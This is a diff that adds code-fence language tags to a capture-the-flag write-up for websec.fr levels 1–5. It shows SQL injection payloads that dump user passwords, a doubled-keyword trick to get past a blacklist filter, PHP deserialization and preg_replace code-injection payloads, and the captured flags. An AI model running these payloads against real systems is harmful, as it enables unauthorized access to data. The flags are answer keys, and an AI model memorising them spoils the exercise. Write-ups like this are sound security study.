@@ -1,6 +1,6 @@
 **[Level01](http://websec.fr/level01/)**  
 Using GROUP_CONCAT
-```
+```sql
 -1 UNION SELECT 'a', GROUP_CONCAT(password) FROM users;--
 ```
 ```
@@ -8,12 +8,12 @@ WEBSEC{Simple_SQLite_Injection}
 ```
 **[Level02](http://websec.fr/level02/)**  
 It's same Level01 but filtered by the application using preg_replace()
-```
+```php
 $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
 $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
 ```
 It replace 'union', 'order', 'select', 'from', 'group', 'by' to '', so we try
-```
+```sql
 -1 UUNIONNION SSELECTELECT 'a', GGROUPROUP_CONCAT(password) FFROMROM users;--
 ```
 ```
@@ -21,7 +21,7 @@ WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
 ```
 **[Level03](http://websec.fr/level03/)**  
 It's using <i>password_hash</i> and <i>password_verify</i>, but the hash string is special, it start with <i>7c00</i> and it use sha1 with <i>fa1se</i> instead of <i>false</i>, so the function will return raw 20 character binary format
-```
+```python
 import hashlib
 import string
 i = 0;
@@ -38,7 +38,7 @@ WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
 
 **[Level04](http://websec.fr/level04/)**  
 We can Deserialization by create same class
-```
+```php
 <?php
 
 class SQL {
@@ -86,7 +86,7 @@ WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
 **[Level05](http://websec.fr/level05/)**  
 It use preg_replace, so we try to include 'flag.php'
 http://websec.fr/level05/index.php?a=flag.php
-```
+```html
 %24%7Binclude_once%09%24_GET%5Ba%5D%7D+%24%7Bflag%7D
 ```
 ```
